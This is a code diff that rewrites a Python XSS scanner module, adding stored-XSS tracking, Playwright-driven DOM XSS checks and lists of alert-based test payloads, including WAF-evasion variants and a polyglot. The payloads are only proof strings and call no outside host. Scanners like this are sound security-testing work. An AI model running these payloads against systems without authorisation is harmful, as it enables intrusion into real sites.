@@ -1,89 +1,198 @@
-"""Simple reflected XSS scanner module.
+"""
+XSS Scanner — Full Rewrite
+============================
+Detection methods:
+  1. Reflected XSS    — Payload injected and reflected in same response
+  2. Stored XSS       — Payload injected, then fetched from a secondary URL
+  3. DOM XSS          — Playwright renders the page and checks live DOM / JS sinks
+  4. WAF evasion      — Encoded / obfuscated variants to bypass keyword filters
 
-The module provides `XSSScanner` which can test GET parameters and HTML
-form inputs for reflected XSS by injecting payloads that include a unique
-marker and checking whether the marker (and payload) are reflected back
-unescaped in the HTML response.
+Key improvements over v1:
+  - Stored XSS: tracks injected markers across all crawled URLs, then
+    re-fetches each to check if any marker surfaced elsewhere
+  - DOM XSS: uses Playwright (headless Chromium) to actually execute JS and
+    inspect live DOM sinks (innerHTML, document.write, location.hash,
+    postMessage, eval) — impossible to detect with requests + BeautifulSoup
+  - WAF evasion: SVG/event-handler variants, HTML entity encoding,
+    javascript: URI obfuscation, polyglots
+  - Unique per-injection markers eliminate cross-test collisions
+  - Context detection: html_body, html_attribute, javascript, url_scheme
 """
 from __future__ import annotations
 
 import random
 import re
 import string
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
+from urllib.parse import urljoin
 
 import requests
 
+# Playwright is optional — DOM XSS is skipped gracefully if not installed
+try:
+    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+    PLAYWRIGHT_AVAILABLE = True
+except ImportError:
+    PLAYWRIGHT_AVAILABLE = False
 
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "javascript:alert(1)",
-    "<iframe src=javascript:alert(1)>",
-    "<body onload=alert(1)>",
-    "'\"><script>alert(1)</script>",
-    "<script>alert(String.fromCharCode(88,83,83))</script>",
+
+# ---------------------------------------------------------------------------
+# Payload banks
+# ---------------------------------------------------------------------------
+
+# Reflected / Stored payloads — each embeds a {MARKER} placeholder
+REFLECTED_PAYLOADS: List[Tuple[str, str]] = [
+    ('<script>alert("{MARKER}")</script>',              "script_tag"),
+    ('<img src=x onerror=alert("{MARKER}")>',           "img_onerror"),
+    ('<svg onload=alert("{MARKER}")>',                  "svg_onload"),
+    ('<body onload=alert("{MARKER}")>',                 "body_onload"),
+    ('"><script>alert("{MARKER}")</script>',            "attr_break_script"),
+    ("'><img src=x onerror=alert('{MARKER}')>",        "attr_break_img"),
+    ('<details open ontoggle=alert("{MARKER}")>',       "details_ontoggle"),
+    ('<iframe srcdoc="<script>alert(\'{MARKER}\')</script>">', "iframe_srcdoc"),
+]
+
+# WAF-evasion variants
+WAF_PAYLOADS: List[Tuple[str, str]] = [
+    ('<ScRiPt>alert("{MARKER}")</ScRiPt>',              "case_mix"),
+    ('<script/src=data:,alert("{MARKER}")>',            "script_data_uri"),
+    ('<svg/onload=alert("{MARKER}")>',                  "svg_nospace"),
+    ('&#60;script&#62;alert("{MARKER}")&#60;/script&#62;', "html_entities"),
+    ('<img src=1 oNeRrOr=alert("{MARKER}")>',           "mixed_case_event"),
+    ('<<script>alert("{MARKER}")//<</script>',         "double_open"),
+    ('<input autofocus onfocus=alert("{MARKER}")>',     "autofocus_onfocus"),
+    ('javascript:/*--></title></style></textarea>'
+     '</script><svg onload=alert("{MARKER}")>',         "polyglot"),
+]
+
+# DOM XSS sink patterns to watch in Playwright
+DOM_SINKS = [
+    "innerHTML",
+    "outerHTML",
+    "document.write",
+    "document.writeln",
+    "eval(",
+    "setTimeout(",
+    "setInterval(",
+    "location.href",
+    "location.hash",
+    "location.search",
+    "postMessage",
+    "src=javascript:",
+]
+
+# DOM XSS source → sink test payloads (injected via URL hash / query)
+DOM_PAYLOADS: List[Tuple[str, str]] = [
+    ('<img src=x onerror=alert("{MARKER}")>',   "hash_img"),
+    ('<svg onload=alert("{MARKER}")>',          "hash_svg"),
+    ('javascript:alert("{MARKER}")',            "hash_js_uri"),
+    ('"onmouseover="alert(\'{MARKER}\')',       "attr_inject"),
 ]
 
 
-class XSSScanner:
-    """Scanner for reflected cross-site scripting (XSS) tests.
+# ---------------------------------------------------------------------------
+# Helpers
+# ---------------------------------------------------------------------------
 
-    Methods are intentionally simple and conservative: they look for an
-    unescaped unique marker injected alongside a payload and classify the
-    context where it appears (HTML body, attribute, or JavaScript).
+def _marker() -> str:
+    rnd = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+    return f"XSS_{rnd}"
+
+
+def _inject(template: str, marker: str) -> str:
+    return template.replace("{MARKER}", marker)
+
+
+def _detect_context(html: str, marker: str) -> str:
+    """Heuristic: where in the HTML does the marker appear?"""
+    script_re = re.compile(
+        r"<script[^>]*>.*?" + re.escape(marker) + r".*?</script>",
+        re.IGNORECASE | re.DOTALL,
+    )
+    if script_re.search(html):
+        return "javascript"
+
+    attr_re = re.compile(
+        r'\w[\w-]*\s*=\s*["\'][^"\']*' + re.escape(marker),
+        re.IGNORECASE,
+    )
+    if attr_re.search(html):
+        return "html_attribute"
+
+    url_re = re.compile(r'(?:href|src|action)\s*=\s*["\'][^"\']*' + re.escape(marker),
+                        re.IGNORECASE)
+    if url_re.search(html):
+        return "url_scheme"
+
+    return "html_body"
+
+
+def _snippet(text: str, marker: str, window: int = 60) -> str:
+    idx = text.find(marker)
+    if idx == -1:
+        return ""
+    return text[max(0, idx - window): idx + window]
+
+
+# ---------------------------------------------------------------------------
+# Scanner
+# ---------------------------------------------------------------------------
+
+class XSSScanner:
+    """
+    Multi-method XSS scanner.
+
+    Usage:
+        scanner = XSSScanner(timeout=10)
+
+        # Reflected (immediate)
+        findings = scanner.scan_url(url, params)
+
+        # After scanning all URLs, call to detect stored XSS:
+        stored = scanner.check_stored(all_urls, session)
     """
 
-    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
-        """Create an XSS scanner.
-
-        Args:
-            timeout: Request timeout in seconds.
-        """
+    def __init__(self, timeout: int = 10,
+                 session: Optional[requests.Session] = None) -> None:
         self.timeout = timeout
-        # Use provided session (authenticated) or create new one
-        if session:
-            self.session = session
-        else:
-            self.session = requests.Session()
+        self.session = session or requests.Session()
+        if not session:
             self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})
 
+        # Stored XSS tracking:  marker -> {param, payload, inject_url}
+        self._injected: Dict[str, Dict[str, str]] = {}
+
+        if not PLAYWRIGHT_AVAILABLE:
+            print("[XSS] Playwright not installed — DOM XSS disabled.")
+            print("      Install: pip install playwright && playwright install chromium")
+
+    # ------------------------------------------------------------------
+    # Public API
+    # ------------------------------------------------------------------
+
     def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Test GET parameters for reflected XSS vulnerabilities.
-
-        Args:
-            url: Endpoint URL to test.
-            params: Dict of query parameters.
-
-        Returns:
-            A list of vulnerability dictionaries (empty if none found).
-        """
+        """Test GET parameters for reflected + DOM XSS."""
         findings: List[Dict[str, Any]] = []
+        for param in params:
+            orig = str(params[param])
 
-        for param_name in params.keys():
-            print(f"Testing {param_name} for XSS...")
-            original_value = str(params.get(param_name, ""))
-            for payload in XSS_PAYLOADS:
-                vuln = self._test_reflected_xss(url, param_name, original_value, params, payload, method="GET")
-                if vuln:
-                    findings.append(vuln)
-                    break
+            # 1. Reflected (requests-based)
+            result = self._reflected(url, param, orig, params, "GET")
+            if result:
+                findings.append(result)
+                continue  # skip DOM test if already confirmed
+
+            # 2. DOM XSS via Playwright
+            if PLAYWRIGHT_AVAILABLE:
+                result = self._dom_xss(url, param, orig, params)
+                if result:
+                    findings.append(result)
 
         return findings
 
     def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Test form inputs for reflected XSS vulnerabilities.
-
-        Expected `form_data` like:
-        {
-            'action': 'https://example.com/submit',
-            'method': 'POST',
-            'inputs': [{'name': 'q'}, {'name': 'comment'}]
-        }
-        """
+        """Test form inputs for reflected XSS (and register for stored check)."""
         findings: List[Dict[str, Any]] = []
-
         action = form_data.get("action")
         method = (form_data.get("method") or "GET").upper()
         inputs = form_data.get("inputs", [])
@@ -91,112 +200,227 @@ class XSSScanner:
         if not action or not inputs:
             return findings
 
-        baseline = {inp.get("name", ""): "" for inp in inputs if inp.get("name")}
+        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
 
-        for param_name in baseline.keys():
-            print(f"Testing form param {param_name} for XSS...")
-            original_value = baseline.get(param_name, "")
-            for payload in XSS_PAYLOADS:
-                vuln = self._test_reflected_xss(action, param_name, original_value, baseline, payload, method=method)
-                if vuln:
-                    findings.append(vuln)
-                    break
+        for param in baseline:
+            orig = baseline[param]
+            result = self._reflected(action, param, orig, baseline, method)
+            if result:
+                findings.append(result)
 
         return findings
 
-    def _test_reflected_xss(
-        self,
-        test_url: str,
-        param_name: str,
-        original_value: str,
-        params: Dict[str, Any],
-        payload: str,
-        method: str = "GET",
-    ) -> Optional[Dict[str, Any]]:
-        """Inject payload with a unique marker and check response for reflection.
-
-        If the payload appears unescaped in the response, returns a vulnerability
-        dictionary with evidence and context; otherwise returns None.
+    def check_stored(self, all_urls: List[str],
+                     session: Optional[requests.Session] = None) -> List[Dict[str, Any]]:
         """
-        marker = self._generate_unique_marker()
-        payload_with_marker = self._embed_marker(payload, marker)
+        After all injections are done, re-fetch every known URL and look for
+        any previously injected markers surfacing in a different response.
 
-        try:
-            injected = original_value + payload_with_marker if original_value else payload_with_marker
-            data = params.copy()
-            data[param_name] = injected
+        Call this once after all scan_url / scan_form calls complete.
+        """
+        if not self._injected:
+            return []
 
-            if method.upper() == "GET":
-                resp = self.session.get(test_url, params=data, timeout=self.timeout)
-            else:
-                resp = self.session.post(test_url, data=data, timeout=self.timeout)
+        findings: List[Dict[str, Any]] = []
+        sess = session or self.session
+        print(f"[XSS] Checking {len(all_urls)} URLs for stored XSS "
+              f"({len(self._injected)} markers tracked)...")
 
-            text = resp.text or ""
+        for url in all_urls:
+            try:
+                resp = sess.get(url, timeout=self.timeout)
+                text = resp.text
+            except requests.RequestException:
+                continue
 
-            # Check for the literal marker (unescaped)
-            if marker in text:
-                # Determine if full payload appears exactly
-                exact_found = payload_with_marker in text
-                confidence = 95 if exact_found else 70
+            for marker, meta in self._injected.items():
+                if marker in text and meta["inject_url"] != url:
+                    context = _detect_context(text, marker)
+                    snip    = _snippet(text, marker)
+                    print(f"    [!] Stored XSS: injected on {meta['inject_url']}, "
+                          f"reflected on {url} (param={meta['param']})")
+                    findings.append({
+                        "vulnerable":   True,
+                        "type":         "stored-xss",
+                        "param":        meta["param"],
+                        "payload":      meta["payload"],
+                        "inject_url":   meta["inject_url"],
+                        "reflect_url":  url,
+                        "evidence":     snip,
+                        "context":      context,
+                        "confidence":   90,
+                    })
 
-                # Extract snippet for evidence
-                idx = text.find(marker)
-                start = max(0, idx - 25)
-                end = min(len(text), idx + 25)
-                snippet = text[start:end]
+        return findings
 
-                # Basic context heuristics
-                context = self._detect_context(text, marker)
+    # ------------------------------------------------------------------
+    # Detection method 1: Reflected XSS
+    # ------------------------------------------------------------------
 
-                print(f"Reflected XSS detected on {param_name} (context={context}, confidence={confidence})")
+    def _reflected(self, url: str, param: str, original: str,
+                   params: Dict[str, Any], method: str) -> Optional[Dict]:
+        all_payloads = REFLECTED_PAYLOADS + WAF_PAYLOADS
+
+        for template, label in all_payloads:
+            mark    = _marker()
+            payload = _inject(template, mark)
+            injected_val = original + payload
+
+            text = self._fetch(url, {**params, param: injected_val}, method)
+            if text is None:
+                continue
+
+            if mark in text:
+                context    = _detect_context(text, mark)
+                exact      = payload in text
+                confidence = 95 if exact else 72
+                snip       = _snippet(text, mark)
+
+                print(f"    [!] Reflected XSS on '{param}' ({label}, "
+                      f"context={context})")
+
+                # Register marker for stored XSS sweep
+                self._injected[mark] = {
+                    "param":      param,
+                    "payload":    payload,
+                    "inject_url": url,
+                }
 
                 return {
                     "vulnerable": True,
-                    "type": "reflected-xss",
-                    "param": param_name,
-                    "payload": payload_with_marker,
-                    "evidence": snippet,
+                    "type":       "reflected-xss",
+                    "param":      param,
+                    "payload":    payload,
+                    "evidence":   snip,
+                    "context":    context,
                     "confidence": confidence,
-                    "context": context,
+                    "url":        url,
                 }
 
-        except requests.RequestException as exc:
-            print(f"Request failed during XSS test for {param_name}: {exc}")
+            # Even if not reflected yet, track for stored XSS
+            self._injected[mark] = {
+                "param":      param,
+                "payload":    payload,
+                "inject_url": url,
+            }
 
         return None
 
-    def _generate_unique_marker(self) -> str:
-        """Generate a short unique marker for payload tracking."""
-        rnd = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        return f"XSS_{rnd}"
+    # ------------------------------------------------------------------
+    # Detection method 2: DOM XSS via Playwright
+    # ------------------------------------------------------------------
 
-    def _embed_marker(self, payload: str, marker: str) -> str:
-        """Place the unique marker inside the payload where sensible.
-
-        Prefer inserting into common alert() calls when present to increase
-        likelihood of reflection in JS contexts; otherwise append the marker.
+    def _dom_xss(self, url: str, param: str, original: str,
+                 params: Dict[str, Any]) -> Optional[Dict]:
         """
-        if "alert(1)" in payload:
-            return payload.replace("alert(1)", f"alert('{marker}')")
-        if "String.fromCharCode" in payload:
-            return payload.replace("String.fromCharCode(88,83,83)", f"'{marker}'")
-        # For javascript: payloads and others, append marker
-        return payload + marker
-
-    def _detect_context(self, text: str, marker: str) -> str:
-        """Heuristic detection of where the marker appears.
-
-        Returns one of: 'html_body', 'html_attribute', 'javascript'.
+        Uses Playwright (headless Chromium) to:
+          1. Navigate to the page with an injected hash / query payload
+          2. Listen for alert() dialogs — if one fires containing our marker,
+             it's confirmed DOM XSS
+          3. Also inspects document.body.innerHTML for unescaped marker
         """
-        # Check script tag
-        script_pattern = re.compile(r"<script[^>]*>.*?" + re.escape(marker) + r".*?</script>", re.IGNORECASE | re.DOTALL)
-        if script_pattern.search(text):
-            return "javascript"
+        mark = _marker()
 
-        # Attribute context: look for attribute assignments containing marker
-        attr_pattern = re.compile(r"\w+\s*=\s*['\"][^'\"]*" + re.escape(marker) + r"[^'\"]*['\"]", re.IGNORECASE)
-        if attr_pattern.search(text):
-            return "html_attribute"
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True)
+            page    = browser.new_page()
 
-        # Fallback to html body
-        return "html_body"
+            dialog_fired = {"value": None}
+
+            def _on_dialog(dialog):
+                dialog_fired["value"] = dialog.message
+                dialog.dismiss()
+
+            page.on("dialog", _on_dialog)
+
+            for template, label in DOM_PAYLOADS:
+                payload = _inject(template, mark)
+
+                # Test via URL hash (common DOM XSS source)
+                test_url = f"{url}#{payload}"
+                try:
+                    page.goto(test_url, timeout=8000, wait_until="networkidle")
+                    page.wait_for_timeout(1500)  # let JS execute
+                except PWTimeout:
+                    pass
+
+                # Check if alert fired with our marker
+                if dialog_fired["value"] and mark in str(dialog_fired["value"]):
+                    browser.close()
+                    print(f"    [!] DOM XSS via hash on '{param}' ({label}) — "
+                          f"alert fired!")
+                    return {
+                        "vulnerable": True,
+                        "type":       "dom-xss",
+                        "param":      param,
+                        "payload":    payload,
+                        "evidence":   f"alert() fired with marker {mark}",
+                        "context":    "javascript",
+                        "confidence": 98,
+                        "url":        test_url,
+                        "sink":       "alert()",
+                    }
+
+                # Also check rendered DOM for unescaped marker
+                try:
+                    dom_html = page.evaluate("document.body.innerHTML")
+                    if mark in dom_html:
+                        context = _detect_context(dom_html, mark)
+                        snip    = _snippet(dom_html, mark)
+                        browser.close()
+                        print(f"    [!] DOM XSS (innerHTML) on '{param}' ({label})")
+                        return {
+                            "vulnerable": True,
+                            "type":       "dom-xss",
+                            "param":      param,
+                            "payload":    payload,
+                            "evidence":   snip,
+                            "context":    context,
+                            "confidence": 88,
+                            "url":        test_url,
+                            "sink":       "innerHTML",
+                        }
+                except Exception:
+                    pass
+
+                # Test via query param
+                test_url_q = f"{url}?{param}={payload}"
+                try:
+                    page.goto(test_url_q, timeout=8000, wait_until="networkidle")
+                    page.wait_for_timeout(1500)
+                except PWTimeout:
+                    pass
+
+                if dialog_fired["value"] and mark in str(dialog_fired["value"]):
+                    browser.close()
+                    print(f"    [!] DOM XSS via query on '{param}' ({label})")
+                    return {
+                        "vulnerable": True,
+                        "type":       "dom-xss",
+                        "param":      param,
+                        "payload":    payload,
+                        "evidence":   f"alert() fired with marker {mark}",
+                        "context":    "javascript",
+                        "confidence": 98,
+                        "url":        test_url_q,
+                        "sink":       "alert()",
+                    }
+
+            browser.close()
+        return None
+
+    # ------------------------------------------------------------------
+    # Internals
+    # ------------------------------------------------------------------
+
+    def _fetch(self, url: str, params: Dict[str, Any],
+               method: str) -> Optional[str]:
+        try:
+            if method.upper() == "GET":
+                r = self.session.get(url,  params=params, timeout=self.timeout)
+            else:
+                r = self.session.post(url, data=params,   timeout=self.timeout)
+            return r.text
+        except requests.RequestException as exc:
+            print(f"    [err] {exc}")
+            return None
